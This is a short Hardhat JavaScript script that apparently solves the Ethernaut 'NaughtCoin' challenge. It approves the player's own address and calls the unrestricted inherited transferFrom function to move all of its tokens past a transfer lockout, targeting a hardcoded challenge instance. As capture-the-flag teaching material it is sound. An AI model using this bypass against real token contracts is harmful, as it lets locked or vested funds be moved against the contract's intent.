const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x61F797478CA9F9CA7cA81B811EeC5268a6Ca593d'
const abi = [
    "function approve(address _spender, uint256 _value) external returns (bool)",
    "function transferFrom(address _from, address _to, uint256 _value) external returns (bool)",
    "function balanceOf(address _owner) external view returns (uint256)"
]

async function hack(contract, signer) {
    // The NaughtCoin contract overrides the transfer function, but doesn't touch the transferFrom function.
    // First, we need to approve ourselves to spend the tokens through transferFrom.
    const approveTx = await contract.approve(signer.address, ethers.utils.parseEther('1000000'));
    await approveTx.wait();
    console.log("Approved tokens for self to transfer.")

    // Then we send them using the non-overwritten OpenZeppelin function.
    const transferTx = await contract.transferFrom(signer.address, contract.address, ethers.utils.parseEther('1000000'));
    await transferTx.wait();
    console.log("Transferred tokens to contract.")

    const balance = await contract.balanceOf(signer.address);
    console.log(`Balance: ${balance}`);
    console.log("What lockout period? ;)")
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})